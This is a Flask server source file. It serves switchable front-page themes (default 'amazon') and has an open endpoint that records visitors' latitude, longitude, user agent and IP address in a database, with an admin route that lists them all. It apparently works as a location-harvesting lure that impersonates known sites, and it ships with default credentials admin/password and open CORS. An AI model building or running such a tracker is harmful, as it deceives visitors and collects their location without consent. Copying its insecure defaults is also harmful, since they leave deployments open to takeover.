from flask import Flask, request, jsonify, render_template, redirect, url_for, Response
import os
import mysql.connector
from flask_cors import CORS
import logging
from functools import wraps

app = Flask(__name__)
CORS(app)

logging.basicConfig(level=logging.DEBUG)

# Connect to the JawsDB MySQL database
db_url = os.environ.get('JAWSDB_URL')
if db_url:
    db_url = db_url.replace("mysql://", "")
    db_user, rest = db_url.split(":", 1)
    db_password, rest = rest.split("@", 1)
    db_host_port, db_name = rest.split("/", 1)
    db_host = db_host_port.split(":")[0]

    db_connection = mysql.connector.connect(
        host=db_host,
        user=db_user,
        password=db_password,
        database=db_name
    )
else:
    db_connection = None

# Authentication credentials
AUTH_USERNAME = os.environ.get('AUTH_USERNAME', 'admin')  # Default username: admin
AUTH_PASSWORD = os.environ.get('AUTH_PASSWORD', 'password')  # Default password: password

def check_auth(username, password):
    """Check if the provided username and password are correct."""
    return username == AUTH_USERNAME and password == AUTH_PASSWORD

def authenticate():
    """Send a 401 response to request authentication."""
    return Response(
        'Unauthorized access. Please provide valid credentials.\n',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    """Decorator to enforce authentication on specific routes."""
    @wraps(f)  # This ensures the original function's name and metadata are preserved
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

def get_selected_theme():
    """Fetch the selected theme from the database."""
    cursor = db_connection.cursor(dictionary=True)
    cursor.execute("SELECT name FROM themes WHERE is_selected = TRUE")
    result = cursor.fetchone()
    return result['name'] if result else 'amazon'  # Default to 'amazon'

def get_all_themes():
    """Fetch all available themes from the database."""
    cursor = db_connection.cursor(dictionary=True)
    cursor.execute("SELECT name, is_selected FROM themes")
    return cursor.fetchall()

def set_selected_theme(theme):
    """Update the selected theme in the database."""
    cursor = db_connection.cursor()
    # Reset all themes to not selected
    cursor.execute("UPDATE themes SET is_selected = FALSE")
    # Set the selected theme
    cursor.execute("UPDATE themes SET is_selected = TRUE WHERE name = %s", (theme,))
    db_connection.commit()

@app.route('/')
def index():
    theme = get_selected_theme()
    return render_template(f'{theme}/index.html')

@app.route('/admin')
@requires_auth
def admin_dashboard():
    themes = get_all_themes()
    return render_template('admin/dashboard.html', themes=themes)

@app.route('/admin/set-theme', methods=['POST'])
@requires_auth
def set_theme():
    theme = request.form.get('theme')
    if theme:
        set_selected_theme(theme)
    return redirect(url_for('admin_dashboard'))

@app.route('/location', methods=['POST'])
def location():
    try:
        # Parse the JSON data from the request
        location_data = request.get_json()
        cursor = db_connection.cursor()
        cursor.execute(
            "INSERT INTO locations (latitude, longitude, user_agent, ip_address) VALUES (%s, %s, %s, %s)",
            (location_data['latitude'], location_data['longitude'], location_data['userAgent'], request.remote_addr)
        )
        db_connection.commit()
        return jsonify({"message": "Location saved successfully!"}), 200
    except Exception as e:
        print(f"Error handling location data: {e}")
        return jsonify({"error": "Failed to save location"}), 500

@app.route('/locations', methods=['GET'])
@requires_auth
def get_locations():
    try:
        cursor = db_connection.cursor(dictionary=True)
        cursor.execute("SELECT * FROM locations")
        locations = cursor.fetchall()
        return jsonify(locations), 200
    except Exception as e:
        print(f"Error retrieving locations: {e}")
        return jsonify({"error": "Failed to retrieve locations"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8000))
    app.run(host='0.0.0.0', port=port)